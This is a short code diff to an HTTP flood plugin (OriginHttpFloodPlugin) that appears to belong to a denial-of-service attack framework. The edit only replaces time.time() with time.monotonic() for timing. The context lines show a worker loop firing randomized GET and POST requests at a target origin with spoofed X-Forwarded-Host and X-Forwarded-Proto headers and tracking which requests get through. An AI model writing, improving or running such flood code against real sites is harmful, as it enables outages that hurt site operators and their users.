@@ -84,13 +84,13 @@ class OriginHttpFloodPlugin(AttackPlugin):
                 headers["X-Forwarded-Host"] = domain
                 headers["X-Forwarded-Proto"] = urlparse(context.url).scheme
 
-                t = time.time()
+                t = time.monotonic()
                 try:
                     # v24: Mix of GET and POST for diversity
                     if random.random() < 0.8:
                         async with context.session.get(url, headers=headers,
                                                        ssl=_ssl, allow_redirects=False) as resp:
-                            rt = time.time() - t
+                            rt = time.monotonic() - t
                             resp_headers = dict(resp.headers)
                             response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                             ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
@@ -100,7 +100,7 @@ class OriginHttpFloodPlugin(AttackPlugin):
                         async with context.session.post(url, headers=headers,
                                                         data=f"q={rand_str(8)}",
                                                         ssl=_ssl, allow_redirects=False) as resp:
-                            rt = time.time() - t
+                            rt = time.monotonic() - t
                             resp_headers = dict(resp.headers)
                             response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                             ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
@@ -109,7 +109,7 @@ class OriginHttpFloodPlugin(AttackPlugin):
                 except asyncio.CancelledError:
                     raise
                 except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
-                    rt = time.time() - t
+                    rt = time.monotonic() - t
                     self._on_request_result(worker_id, False)
                     await self._record("ORI", False, 0, rt, err=type(exc).__name__)
 
